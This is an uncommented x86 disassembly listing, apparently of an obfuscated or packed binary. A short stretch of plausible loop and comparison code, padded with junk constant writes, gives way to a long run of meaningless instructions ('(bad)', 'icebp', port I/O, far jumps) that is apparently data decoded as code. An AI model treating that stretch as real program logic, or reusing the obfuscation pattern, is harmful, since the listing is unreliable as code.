  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x42fa28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0xb3e929ff,eax
  408b09:	mov    BYTE PTR [edi],dh
  408b0b:	jmp    0x7b9c:0x137b7be5
  408b12:	jnp    0x408b87
  408b14:	sub    DWORD PTR [edi+ecx*8],esi
  408b17:	mov    edi,0x973c12ab
  408b1c:	pop    ecx
  408b1d:	test   eax,0x478bb7ec
  408b22:	icebp  
  408b23:	xchg   edi,eax
  408b24:	gs push eax
  408b26:	call   0x202ffc93
  408b2b:	cwde   
  408b2c:	scas   al,BYTE PTR es:[edi]
  408b2d:	add    DWORD PTR [edi+edx*2],ebp
  408b30:	js     0x408baf
  408b32:	idiv   DWORD PTR [eax-0x51eea475]
  408b38:	cmp    BYTE PTR cs:[edi-0x6feaee5e],al
  408b3f:	xor    ah,BYTE PTR [ebx+0x9]
  408b42:	aam    0xee
  408b44:	xchg   edx,eax
  408b45:	sbb    DWORD PTR [ebp+0xb],eax
  408b48:	je     0x408bc4
  408b4a:	call   DWORD PTR [ebx+0x72]
  408b4d:	cmp    al,BYTE PTR [ecx]
  408b4f:	rcl    BYTE PTR [ebp+0x65],0xc
  408b53:	test   DWORD PTR cs:[edx],esp
  408b56:	ins    BYTE PTR es:[edi],dx
  408b57:	fiadd  DWORD PTR [ebx-0x30]
  408b5a:	mov    ebx,0x130de24c
  408b5f:	push   es
  408b60:	dec    ebp
  408b61:	push   es
  408b62:	add    eax,0x37105741
  408b67:	mov    BYTE PTR [edi-0x3fc89dc0],cl
  408b6d:	dec    eax
  408b6e:	out    dx,al
  408b6f:	out    dx,al
  408b70:	push   eax
  408b71:	lods   al,BYTE PTR ds:[esi]
  408b72:	test   DWORD PTR [ebx],ebx
  408b74:	aas    
  408b75:	fwait
  408b76:	xchg   ebx,eax
  408b77:	xchg   edx,eax
  408b78:	push   ecx
  408b79:	mov    bl,dl
  408b7b:	pop    ss
  408b7c:	cmp    ch,BYTE PTR [ecx]
  408b7e:	push   esi
  408b7f:	push   edx
  408b80:	adc    al,0xaf
  408b82:	scas   eax,DWORD PTR es:[di]
  408b84:	push   ecx
  408b85:	jbe    0x408b6b
  408b87:	pop    ebp
  408b88:	std    
  408b89:	add    cl,dh
  408b8b:	lds    eax,FWORD PTR [ebx+0x5893bc82]
  408b91:	xchg   DWORD PTR [eax+0x492e0b67],ecx
  408b97:	inc    edx
  408b98:	jl     0x408b21
  408b9a:	push   ebx
  408b9b:	es sti 
  408b9d:	mov    es,WORD PTR [eax-0x4c]
  408ba0:	jmp    0xbbe9:0x214cef9e
  408ba7:	jp     0x408b50
  408ba9:	jg     0x408b8a
  408bab:	ds adc bh,bh
  408bae:	movd   DWORD PTR [edx],mm7
  408bb1:	aas    
  408bb2:	ja     0x408bc1
  408bb4:	sbb    DWORD PTR [esi-0x44d9689c],0xb0601e85
  408bbe:	adc    BYTE PTR [edi-0x17],0x14
  408bc2:	sbb    eax,0x5b2801c9
  408bc7:	or     eax,0x54502b3d
  408bcc:	stos   DWORD PTR es:[edi],eax
  408bcd:	or     al,0x7e
  408bcf:	ds out dx,al
  408bd1:	jmp    0x408bfd
  408bd3:	rcl    BYTE PTR [edx+ebp*8],1
  408bd6:	adc    cl,BYTE PTR [edi-0x37]
  408bd9:	jmp    0xbe375a3
  408bde:	cld    
  408bdf:	out    0xb8,al
  408be1:	adc    ebx,DWORD PTR [ebp+edi*4-0x3fbf7e8f]
  408be8:	dec    ecx
  408be9:	mov    eax,ds:0x8f622a81
  408bee:	or     eax,0xdd4bc181
  408bf3:	and    dh,BYTE PTR [ecx]
  408bf5:	xor    al,0xb6
  408bf7:	retf   
  408bf8:	popf   
  408bf9:	mov    edx,0x63466639
  408bfe:	jle    0xc82c67be
  408c04:	fstp   DWORD PTR [ebp-0x18]
  408c07:	(bad)  [esi+0x7bda7cdf]
  408c0d:	cmp    cl,ch
  408c0f:	fwait
  408c10:	stos   DWORD PTR es:[edi],eax
  408c11:	hlt    
  408c12:	in     al,dx
  408c13:	popa   
  408c14:	mov    esi,0xf2a51ba5
  408c19:	cwde   
  408c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c1b:	jno    0x408c98
  408c1d:	scas   al,BYTE PTR es:[edi]
  408c1e:	add    eax,0x1184ea90
  408c23:	icebp  
  408c24:	and    DWORD PTR [edi+0x29],ecx
  408c27:	inc    ebx
  408c28:	xchg   ebp,eax
  408c29:	dec    edx
  408c2a:	aaa    
  408c2b:	push   esp
  408c2c:	xchg   edi,eax
  408c2d:	jnp    0x408bba
  408c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c30:	stc    
  408c31:	repz or edx,eax
  408c34:	push   es
  408c35:	mov    eax,0xcb59ea03
  408c3a:	arpl   WORD PTR [edi],dx
  408c3c:	pop    ss
  408c3d:	fistp  WORD PTR [esi+0x3a]
  408c40:	fmulp  st(5),st
  408c42:	shl    BYTE PTR cs:[edi],1
  408c45:	or     cl,dh
  408c47:	cmc    
  408c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c49:	inc    eax
  408c4a:	and    dh,bl
  408c4c:	xchg   esi,eax
  408c4d:	xchg   BYTE PTR [eax],ah
  408c4f:	inc    edi
  408c50:	sti    
  408c51:	dec    eax
  408c52:	ss cdq 
  408c54:	sbb    dl,BYTE PTR [esp+edi*1-0x20]
  408c58:	sbb    eax,DWORD PTR [esp+ecx*4+0x1f8798be]
  408c5f:	sub    BYTE PTR [edx+0x48c956a],cl
  408c65:	jae    0x408bec
  408c67:	popa   
  408c68:	push   ss
  408c69:	pop    ds
  408c6a:	sbb    al,0x9a
  408c6c:	and    cl,dh
  408c6e:	jp     0x408ce0
  408c70:	mov    ah,0xc9
  408c72:	lods   eax,DWORD PTR ds:[esi]
  408c73:	mov    dl,dh
  408c75:	add    DWORD PTR [edx-0x256ec010],edx
  408c7b:	push   ss
  408c7c:	and    bh,BYTE PTR [eax+0x2287bb0b]
  408c82:	repnz push esi
  408c84:	mov    ecx,0xc3a81827
  408c89:	xchg   ecx,eax
  408c8a:	dec    esp
  408c8b:	and    cl,BYTE PTR [esi]
  408c8d:	add    esi,DWORD PTR [ecx+0x12]
  408c90:	pop    esp
  408c91:	arpl   cx,di
  408c93:	push   es
  408c94:	xor    DWORD PTR [edx-0x36],0xa0adddb3
  408c9b:	inc    ebx
  408c9c:	frndint 
  408c9e:	shr    BYTE PTR [ebx-0x24fbc6ab],0x4e
  408ca5:	adc    eax,0x4a928dfd
  408caa:	lods   al,BYTE PTR ds:[esi]
  408cab:	mov    ah,0x8e
  408cad:	jmp    0xd7348090
  408cb2:	sbb    ecx,DWORD PTR [ecx-0x4e2e25e4]
  408cb8:	imul   esi,DWORD PTR ds:0x1d9b4bd7,0xffffffb6
  408cbf:	mov    ds:0x9d0ab7df,eax
  408cc4:	fcom   DWORD PTR [edx]
  408cc6:	jge    0x408c78
  408cc8:	add    al,0x3c
  408cca:	pop    ebp
  408ccb:	cmp    edi,DWORD PTR ss:[eax+0x10]
  408ccf:	lods   eax,DWORD PTR ds:[esi]
  408cd0:	imul   ebx,DWORD PTR [edx-0x435c10e8],0xffffffc7
  408cd7:	scas   eax,DWORD PTR es:[edi]
  408cd8:	clc    
  408cd9:	pop    edx
  408cda:	mov    bl,0x6f
  408cdc:	mov    dl,0x60
  408cde:	arpl   ax,dx
  408ce0:	mov    ebp,0x5ef785e6
  408ce5:	adc    DWORD PTR [edi+esi*4],edx
  408ce8:	lea    eax,[edx+0x5fa46981]
  408cee:	cwde   
  408cef:	xchg   esi,eax
  408cf0:	inc    ebp
  408cf1:	aam    0xc6
  408cf3:	call   0x1f65:0xec4414d6
  408cfa:	je     0x408cd8
  408cfc:	nop
  408cfd:	mov    ebp,0xd599d870
  408d02:	adc    BYTE PTR [eax+0x711043e5],0xa7
  408d09:	icebp  
  408d0a:	xchg   ecx,eax
  408d0b:	dec    ecx
  408d0c:	push   ebx
  408d0d:	adc    al,0xb7
  408d0f:	icebp  
  408d10:	mov    ?,WORD PTR [ecx]
  408d12:	adc    eax,ebp
  408d14:	and    edi,DWORD PTR [eax+0x3d]
  408d17:	cld    
  408d18:	jmp    0x408d79
  408d1a:	push   edi
  408d1b:	cmp    bl,cl
  408d1d:	scas   al,BYTE PTR es:[edi]
  408d1e:	mov    ebp,0x107d13bf
  408d23:	sahf   
  408d24:	mov    ecx,DWORD PTR [edx+0x34]
  408d27:	mov    bh,0x5c
  408d29:	retf   0xb9f4
  408d2c:	xor    dh,al
  408d2e:	mov    esi,0xdc58e71a
  408d33:	cmp    edi,DWORD PTR [esi+ecx*2-0x7]
  408d37:	or     DWORD PTR [edx-0x13727b55],ecx
  408d3d:	addr16 jle 0x408d02
  408d40:	xor    dh,bh
  408d42:	cmc    
  408d43:	add    esi,DWORD PTR [ebx+0x65]
  408d46:	enter  0x587f,0x25
  408d4a:	xchg   edi,esi
  408d4c:	push   esi
  408d4d:	aad    0xf0
  408d4f:	imul   esp,DWORD PTR [ebp-0x49],0xffffff94
  408d53:	inc    edx
  408d54:	and    ebx,esp
  408d56:	mov    dl,0xef
  408d58:	aaa    
  408d59:	out    dx,al
  408d5a:	enter  0x21c5,0xde
  408d5e:	jb     0x408cfb
  408d60:	fwait
  408d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d62:	ds hlt 
  408d64:	test   BYTE PTR [ebx-0x6],dh
  408d67:	sahf   
  408d68:	mov    bh,BYTE PTR [ebx-0x77]
  408d6b:	dec    esi
  408d6c:	pop    es
  408d6d:	js     0x408d88
  408d6f:	(bad)  
  408d70:	mov    dl,0x18
  408d72:	mov    ecx,0xb7649ca6
  408d77:	sbb    edx,esi
  408d79:	add    esi,DWORD PTR [edx-0x3ef8f5e7]
  408d7f:	or     ecx,DWORD PTR [ebp-0x6d7b27d7]
  408d85:	jp     0x408d27
  408d87:	mov    BYTE PTR [eax-0x1ff8c13d],cl
  408d8d:	cld    
  408d8e:	scas   eax,DWORD PTR es:[edi]
  408d8f:	jle    0x408d39
  408d91:	jno    0x408d31
  408d93:	popa   
  408d94:	sub    al,0xd4
  408d96:	xchg   ebx,eax
  408d97:	and    ebx,DWORD PTR [ebx]
  408d99:	pushf  
  408d9a:	test   al,0xda
  408d9c:	sub    bl,bl
  408d9e:	lods   eax,DWORD PTR ds:[esi]
  408d9f:	in     eax,0xf9
  408da1:	inc    edi
  408da2:	mov    ebx,0xc4e7944b
  408da7:	fnstenv [eax]
  408da9:	push   ebp
  408daa:	mov    eax,0xa29a537
  408daf:	xor    bl,BYTE PTR [ebp-0x79]
  408db2:	jb     0x408d97
  408db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408db5:	mov    BYTE PTR [eax+0x7814e029],0x8f
  408dbc:	dec    ecx
  408dbd:	out    dx,al
  408dbe:	lahf   
  408dbf:	mov    esi,0xdccee798
  408dc4:	mov    ebp,0x822227f9
  408dc9:	mov    dh,0x9e
  408dcb:	or     DWORD PTR [edx],edi
  408dcd:	and    BYTE PTR [edi+0x5927093],dh
  408dd3:	loopne 0x408d83
  408dd5:	sub    al,0x58
  408dd7:	stc    
  408dd8:	enter  0x83b7,0x5
  408ddc:	push   0xffffffa3
  408dde:	bound  ebx,QWORD PTR [edi+0x6e]
  408de1:	push   edx
  408de2:	sbb    BYTE PTR [edi+ecx*8-0x7d],ah
  408de6:	scas   al,BYTE PTR es:[edi]
  408de7:	adc    al,0x15
  408de9:	xchg   edi,eax
  408dea:	pusha  
  408deb:	jbe    0x408e44
  408ded:	lea    esp,[ebx]
  408def:	iret   
  408df0:	vmwrite edx,DWORD PTR [edi-0x63c73776]
  408df7:	add    DWORD PTR [eax],0x25c99de0
  408dfd:	loop   0x408e72
  408dff:	lahf   
  408e00:	pop    esp
  408e01:	and    DWORD PTR [ecx-0x5a],esp
  408e04:	inc    esi
  408e05:	xor    eax,0x24ab5ea5
  408e0a:	jae    0x408de6
  408e0c:	xor    bh,BYTE PTR [ebx-0x41d53501]
  408e12:	test   bl,ah
  408e14:	jae    0x408e6f
  408e16:	push   0x8dbe36a2
  408e1b:	mov    ds:0x59123354,al
  408e20:	test   BYTE PTR [esi+0x17913a15],dh
  408e26:	mov    dh,ch
  408e28:	sbb    DWORD PTR [ebx-0x64],ecx
  408e2b:	jmp    0xcaa3e21f
  408e30:	sti    
  408e31:	xchg   ebx,eax
  408e32:	jne    0x408e69
  408e34:	push   edi
  408e35:	mov    BYTE PTR [esi],al
  408e37:	(bad)  [ecx]
  408e39:	push   ecx
  408e3a:	out    dx,eax
  408e3b:	mov    ah,bl
  408e3d:	(bad)  
  408e3e:	iret   
  408e3f:	push   0xfffffff5
  408e41:	lods   al,BYTE PTR ds:[esi]
  408e42:	jmp    0x726:0x3f7bb47e
  408e49:	mov    BYTE PTR [ebp-0x51],0x17
  408e4d:	nop
  408e4e:	in     al,dx
  408e4f:	xor    al,0x9d
  408e51:	jmp    0x87ee:0x370d2453
  408e58:	rol    edi,cl
  408e5a:	sahf   
  408e5b:	ror    BYTE PTR [esi],cl
  408e5d:	or     eax,0x28a9c167
  408e62:	dec    esi
  408e63:	or     edi,0xb51c23c8
  408e69:	out    0xc2,eax
  408e6b:	in     eax,dx
  408e6c:	jmp    0x2854:0xc6995aa7
  408e73:	(bad)
  408e76:	adc    dh,BYTE PTR [ebx-0x1118dbc9]
  408e7c:	mov    eax,0xa62e460b
  408e81:	mov    cl,0x3
  408e83:	rol    BYTE PTR [ecx+ebp*1-0x197d9a3e],0x9e
  408e8b:	push   esp
  408e8c:	iret   
  408e8d:	cmp    BYTE PTR [esi-0x4ef9b6b1],dl
  408e93:	popf   
  408e94:	mov    esp,0xfeaa02e9
  408e99:	mov    dl,0x59
  408e9b:	sub    dh,bl
  408e9d:	loope  0x408e9d
  408e9f:	jns    0x408ec9
  408ea1:	loopne 0x408e5e
  408ea3:	dec    ecx
  408ea4:	xor    dh,BYTE PTR [edi-0x68b212bd]
  408eaa:	mov    edi,0xba5c0811
  408eaf:	ja     0x408e3b
  408eb1:	pop    ebx
  408eb2:	sub    eax,0x2276d771
  408eb7:	xor    BYTE PTR [edx+0x12b2f397],ch
  408ebd:	cdq    
  408ebe:	mov    dl,0xcc
  408ec0:	fimul  DWORD PTR [esi+0x18]
  408ec3:	(bad)  
  408ec4:	and    ch,dl
  408ec6:	aas    
  408ec7:	retf   
  408ec8:	ins    DWORD PTR es:[edi],dx
  408ec9:	scas   al,BYTE PTR es:[edi]
  408eca:	cmp    ebp,DWORD PTR [ebp-0x2e64dcb5]
  408ed0:	add    eax,0xd63ca91b
  408ed5:	(bad)  [ecx]
  408ed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ed8:	push   ecx
  408ed9:	xchg   DWORD PTR [esi],ecx
  408edb:	(bad)  
  408edc:	mov    eax,ds:0x2db54ecf
  408ee1:	aas    
  408ee2:	ins    DWORD PTR es:[edi],dx
  408ee3:	xor    dh,bh
  408ee5:	adc    eax,0xf9927f2d
  408eea:	xor    cl,ah
  408eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eed:	inc    edx
  408eee:	enter  0x8aa,0x35
  408ef2:	fdivr  st(2),st
  408ef4:	inc    edi
  408ef5:	bound  ebp,QWORD PTR [ebp-0x80]
  408ef8:	(bad)  
  408ef9:	retf   
  408efa:	addr16 mov dl,0x3b
  408efd:	xchg   esi,eax
  408efe:	das    
  408eff:	dec    esi
  408f00:	stc    
  408f01:	scas   eax,DWORD PTR es:[edi]
  408f02:	xor    ecx,ebp
  408f04:	push   esp
  408f05:	mov    eax,ds:0x593e81a3
  408f0a:	arpl   ax,sp
  408f0c:	stc    
  408f0d:	jle    0x408f03
  408f0f:	inc    ecx
  408f10:	mov    dh,0xa7
  408f12:	mov    dh,0xfe
  408f14:	iret   
  408f15:	repz lds ebp,FWORD PTR [ecx-0x746b565]
  408f1c:	or     edi,DWORD PTR [eax]
  408f1e:	lea    ecx,[ebp+0x44]
  408f21:	sbb    BYTE PTR [edx+0x30],cl
  408f24:	lahf   
  408f25:	xor    ah,dh
  408f27:	sbb    al,BYTE PTR [eax+0x1f]
  408f2a:	cs dec esp
  408f2c:	(bad)  
  408f2e:	lods   al,BYTE PTR ds:[esi]
  408f2f:	sub    BYTE PTR [edi-0x24],0x71
  408f33:	clc    
  408f34:	cmp    dh,BYTE PTR [esi]
  408f36:	mov    cl,0xb5
  408f38:	push   ds
  408f39:	xchg   edi,eax
  408f3a:	ror    ch,1
  408f3c:	pop    ecx
  408f3d:	jb     0x408f0b
  408f3f:	mov    edi,DWORD PTR [ebp+0x52]
  408f42:	aas    
  408f43:	daa    
  408f44:	mov    dl,0x18
  408f46:	mov    ds:0x766e7dbd,eax
  408f4b:	adc    esp,edi
  408f4d:	push   esi
  408f4e:	push   ecx
  408f4f:	jg     0x408ef1
  408f51:	xor    BYTE PTR [esi-0xe876df3],bh
  408f57:	ror    DWORD PTR [edx-0x53],1
  408f5a:	nop
  408f5b:	pop    ss
  408f5c:	inc    ecx
  408f5d:	mov    WORD PTR [edi],cs
  408f5f:	jnp    0x408fcf
  408f61:	sbb    al,0xfd
  408f63:	and    ebx,DWORD PTR [edi+eiz*1-0x2e]
  408f67:	xchg   BYTE PTR [ebp+eiz*2-0x176195e9],dl
  408f6e:	cmp    ebp,DWORD PTR [ecx+0x41c53acf]
  408f74:	mov    ds:0x834d86f2,al
  408f79:	push   esp
  408f7a:	pop    esi
  408f7b:	push   ds
  408f7c:	sbb    al,0xb5
  408f7e:	and    BYTE PTR [esi-0x44],al
  408f81:	icebp  
  408f82:	rcl    DWORD PTR [eax],0x65
  408f85:	(bad)  
  408f86:	mov    BYTE PTR [ebx-0x3c3d8791],ah
  408f8c:	xor    BYTE PTR [ecx],al
  408f8e:	xor    edi,DWORD PTR [ecx]
  408f90:	sti    
  408f91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f92:	lds    ecx,FWORD PTR [ebp+0x78]
  408f95:	xor    ebp,DWORD PTR ds:0x8703e54b
  408f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f9c:	out    dx,eax
  408f9d:	adc    al,0x8b
  408f9f:	mov    al,ds:0x8147919e
  408fa4:	pop    esi
  408fa5:	push   eax
  408fa6:	mov    al,ah
  408fa8:	popf   
  408fa9:	mov    gs,WORD PTR ds:[ebx-0x27ac04f2]
  408fb0:	test   BYTE PTR [edx-0x76d9488f],ch
  408fb6:	dec    eax
  408fb7:	lods   al,BYTE PTR ds:[esi]
  408fb8:	cwde   
  408fb9:	aas    
  408fba:	aam    0xe4
  408fbc:	cmp    DWORD PTR [eax],ebx
  408fbe:	jmp    0x91062ec6
  408fc3:	add    al,0x92
  408fc5:	jg     0x408f80
  408fc7:	and    eax,0xa32e0d6c
  408fcd:	sub    BYTE PTR cs:[eax-0x2c90a6e8],dh
  408fd4:	addr16 pushf 
  408fd6:	mov    al,ds:0xb2604fdc
  408fdb:	(bad)  
  408fdc:	fistp  DWORD PTR [eax+0x7e5e5278]
  408fe2:	sub    dh,BYTE PTR [edx-0x1fd15653]
  408fe8:	iret   
  408fe9:	nop
  408fea:	push   edx
  408feb:	push   eax
  408fec:	sub    edx,eax
  408fee:	add    eax,0x21ac55b9
  408ff3:	inc    eax
  408ff4:	test   DWORD PTR [ebx],ebp
  408ff6:	aad    0xf4
  408ff8:	retf   
  408ff9:	mov    edi,edx
  408ffb:	loope  0x408fc2
  408ffd:	rol    BYTE PTR ds:0x3e3ba9b0,0xc9
  409004:	cmp    eax,0x8143033f
  409009:	xlat   BYTE PTR ds:[ebx]
  40900a:	push   ss
  40900b:	xchg   edx,eax
  40900c:	mov    eax,0xb740f83a
  409011:	lods   al,BYTE PTR ds:[esi]
  409012:	sub    DWORD PTR gs:[ebx-0x313e7e6f],0x549ddaf6
  40901d:	loop   0x408fc2
  40901f:	sub    BYTE PTR [eax+0x3c],dh
  409022:	aam    0x8b
  409024:	test   ebp,ebx
  409026:	push   edi
  409027:	pop    eax
  409028:	stos   WORD PTR es:[edi],ax
  40902a:	sub    eax,0x41ea2153
  40902f:	in     al,0x59
  409031:	cdq    
  409032:	out    dx,eax
  409033:	push   ds
  409034:	inc    ebx
  409035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409036:	clc    
  409037:	mov    ecx,edx
  409039:	es pop ss
  40903b:	frstor [ecx-0xa93988]
  409041:	je     0x409013
  409043:	into   
  409044:	sahf   
  409045:	xchg   BYTE PTR [ecx],dh
  409047:	retf   0xe177
  40904a:	mov    edx,0xc2b36881
  40904f:	sub    al,0x17
  409051:	mov    edi,0xa8b3f25b
  409056:	lods   al,BYTE PTR ds:[esi]
  409057:	add    bh,BYTE PTR [ecx]
  409059:	sbb    DWORD PTR [ebx+0x596ca2f],ebp
  40905f:	jge    0x409059
  409061:	jge    0x409070
  409063:	push   esi
  409064:	sub    WORD PTR [ecx-0x67],si
  409068:	lock push ss
  40906a:	out    dx,al
  40906b:	push   edx
  40906c:	(bad)  
  40906d:	cmp    eax,0x8d384691
  409072:	imul   edi,DWORD PTR [ecx],0xffffffde
  409075:	pop    ebx
  409076:	add    al,0x6a
  409078:	test   DWORD PTR [ecx+0x62ac7ca7],ebp
  40907e:	shl    BYTE PTR [ebp+0x1d4b0e29],1
  409084:	and    BYTE PTR [esp+edx*4-0x4af75e86],cl
  40908b:	aad    0x51
  40908d:	xor    eax,0x4a49e03b
  409092:	mov    dl,0xb5
  409094:	lods   al,BYTE PTR ds:[esi]
  409095:	pop    es
  409096:	mov    ch,cl
  409098:	adc    eax,0x3f4ad45a
  40909d:	pop    ebp
  40909e:	dec    edi
  40909f:	ins    BYTE PTR es:[edi],dx
  4090a0:	mov    dl,0xc3
  4090a2:	retf   0xcac5
  4090a5:	sub    ebp,DWORD PTR [ecx]
  4090a7:	sbb    al,0xce
  4090a9:	in     eax,0xc3
  4090ab:	jne    0x4090c8
  4090ad:	adc    DWORD PTR [ecx+0x1c2992a9],esp
  4090b3:	cli    
  4090b4:	adc    dh,BYTE PTR ds:[ecx+0x2c]
  4090b8:	pop    ecx
  4090b9:	mov    al,0xaa
  4090bb:	push   eax
  4090bc:	add    eax,0x397f05f2
  4090c1:	retf   
  4090c2:	mov    ecx,0xe247ee95
  4090c7:	aas    
  4090c8:	(bad)  
  4090c9:	jno    0x4090f3
  4090cb:	in     eax,0x8d
  4090cd:	int    0x92
  4090cf:	cmp    al,0x69
  4090d1:	iret   
  4090d2:	fucomip st,st(4)
  4090d4:	loope  0x4090ea
  4090d6:	mov    edi,0x2db4ff1b
  4090db:	xor    bl,BYTE PTR [edx-0x3f]
  4090de:	leave  
  4090df:	imul   edi,esi,0x71a6d41d
  4090e5:	mov    ecx,0x2fa8c162
  4090ea:	test   DWORD PTR [ebx+0x7a],edx
  4090ed:	sub    eax,0x733dd242
  4090f2:	ja     0x4090c8
  4090f4:	ins    DWORD PTR es:[edi],dx
  4090f5:	scas   eax,DWORD PTR es:[edi]
  4090f6:	mov    ds,WORD PTR [esi+0x5a67b424]
  4090fc:	push   esp
  4090fd:	lods   eax,DWORD PTR ds:[esi]
  4090fe:	xor    al,0xd
  409100:	aam    0xe8
  409102:	scas   al,BYTE PTR es:[edi]
  409103:	add    BYTE PTR [esi-0x57ae26a9],cl
  409109:	cmp    ebx,DWORD PTR [edi+0x12f2e66c]
  40910f:	pusha  
  409110:	scas   eax,DWORD PTR es:[edi]
  409111:	push   0xffffff8d
  409113:	adc    DWORD PTR [ecx-0x44f83191],eax
  409119:	cmc    
  40911a:	call   FWORD PTR [edi]
  40911c:	cmp    eax,0x66fb0871
  409121:	mov    ch,BYTE PTR [ebx-0x55]
  409124:	xor    edx,edx
  409126:	xchg   ebx,eax
  409127:	and    dh,bl
  409129:	push   es
  40912a:	jmp    0x6fa4f3d6
  40912f:	scas   eax,DWORD PTR es:[edi]
  409130:	out    dx,al
  409131:	mov    ah,0xfa
  409133:	dec    ebx
  409134:	jmp    0x2f83:0xb65e650d
  40913b:	and    al,ah
  40913d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40913e:	outs   dx,BYTE PTR ds:[esi]
  40913f:	lods   al,BYTE PTR ds:[esi]
  409140:	jae    0x409138
  409142:	outs   dx,DWORD PTR ds:[esi]
  409143:	push   ebp
  409144:	mov    ch,BYTE PTR [ebx+0x6b]
  409147:	loope  0x4090cc
  409149:	das    
  40914a:	fiadd  DWORD PTR [edi]
  40914c:	add    BYTE PTR [ebx],0x57
  40914f:	repnz push ebx
  409151:	jno    0x4091d1
  409153:	xor    BYTE PTR [edx-0x69],ah
  409156:	add    ch,BYTE PTR [esi-0x5f]
  409159:	sub    al,0xc7
  40915b:	pop    ecx
  40915c:	push   0x7ae819a5
  409161:	push   0xf6a29a59
  409166:	xor    DWORD PTR [edi-0x698433d9],ebp
  40916c:	and    al,0x49
  40916e:	pop    esp
  40916f:	es dec ebp
  409171:	test   BYTE PTR [ebx+0x51101282],ah
  409177:	fsub   DWORD PTR [eax]
  409179:	xchg   esp,eax
  40917a:	add    esi,DWORD PTR [edx+ecx*2-0x698875d4]
  409181:	(bad)  
  409182:	cmp    DWORD PTR [esi],edx
  409184:	jmp    0x9aea:0x5de2aee0
  40918b:	lods   eax,DWORD PTR ds:[esi]
  40918c:	leave  
  40918d:	adc    BYTE PTR [esi],bl
  40918f:	mov    al,ds:0xc5567a25
  409194:	std    
  409195:	jmp    0x40919f
  409197:	pop    ecx
  409198:	jmp    0xb499260a
  40919d:	pop    eax
  40919e:	or     BYTE PTR [ebx+eax*4+0x61],dh
  4091a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091a3:	das    
  4091a4:	xchg   ecx,eax
  4091a5:	push   ecx
  4091a6:	jle    0x4091c9
  4091a8:	and    eax,0xa5b6d61e
  4091ad:	ss jne 0x4091b1
  4091b0:	jno    0x40914a
  4091b2:	inc    esp
  4091b3:	push   ds
  4091b4:	or     BYTE PTR [eax],dh
  4091b6:	(bad)  
  4091b7:	mov    ds:0x4643a38b,eax
  4091bc:	xor    bl,BYTE PTR [edi+0x6f]
  4091bf:	aad    0x3d
  4091c1:	adc    bl,BYTE PTR [edx-0x42]
  4091c4:	lea    ebx,[ebx]
  4091c6:	mov    eax,0x12341079
  4091cb:	mov    bl,0x6b
  4091cd:	mov    ds:0xce65df82,eax
  4091d2:	pop    ebp
  4091d3:	xchg   ebp,eax
  4091d4:	add    BYTE PTR ds:0x1117a757,ch
  4091da:	scas   eax,DWORD PTR es:[edi]
  4091db:	retf   
  4091dc:	js     0x4091e7
  4091de:	jp     0x409228
  4091e0:	(bad)  [ecx+0x1f79f2e8]
  4091e6:	cs nop
  4091e8:	repz lea esi,[ecx]
  4091eb:	in     eax,0xcc
